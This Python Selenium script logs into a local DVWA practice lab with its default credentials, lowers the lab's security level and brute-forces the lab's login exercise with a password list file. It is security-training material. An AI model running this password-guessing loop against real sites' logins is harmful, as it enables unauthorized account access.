import time
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium import webdriver
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import TimeoutException

# Initialize the Chrome driver
driver = webdriver.Chrome()

# Open the DVWA login page
driver.get("http://localhost/DVWA/login.php")

# Wait for the page to load
wait = WebDriverWait(driver, 30)  # Increased wait time to 30 seconds

try:
    # Find the username and password input fields on the login page
    username_field = wait.until(EC.presence_of_element_located((By.NAME, 'username')))
    password_field = wait.until(EC.presence_of_element_located((By.NAME, 'password')))

    # Enter the username and password
    username = 'admin'
    password = 'password'

    print("Entering username:", username)
    for char in username:
        username_field.send_keys(char)
        time.sleep(0.2)  # Delay of 0.2 seconds between each character

    print("Entering password:", password)
    for char in password:
        password_field.send_keys(char)
        time.sleep(0.2)  # Delay of 0.2 seconds between each character

    # Find and click the login button
    login_button = driver.find_element(By.NAME, 'Login')  
    login_button.click()

    # After logging in, navigate to the desired page
    driver.get("http://localhost/DVWA/security.php")

    # Select the security level
    select_element = wait.until(EC.presence_of_element_located((By.NAME, 'security')))
    select = Select(select_element)
    select.select_by_value('low')

    submit_button = driver.find_element(By.NAME, 'seclev_submit')
    submit_button.click()

    # Read the list of passwords from a file
    def read_passwords_file(filename):
        password_list = []
        with open(filename, 'r') as file:
            for line in file:
                password = line.strip()
                password_list.append(password)
        return password_list

    # Path to the file containing passwords
    file_path = 'passwords.txt'
    passwords = read_passwords_file(file_path)

    # Iterate through each password and try to login
    for pw in passwords:
        print(f"Trying password: {pw}")
        driver.get(f"http://localhost/DVWA/vulnerabilities/brute/?username={username}&password={pw}&Login=Login#")
        get_source = driver.page_source
        target_text = 'Welcome to the password protected area'
        if target_text in get_source:
            print(f'User: {username}, password: {pw}')
            time.sleep(5)  # Delay of 5 seconds
            break
    else:
        print("Password not found in the list.")
        
except TimeoutException:
    print("Timeout occurred while waiting for element. Check if the page is fully loaded or if the element NAME is correct.")

# Close the browser
driver.quit()

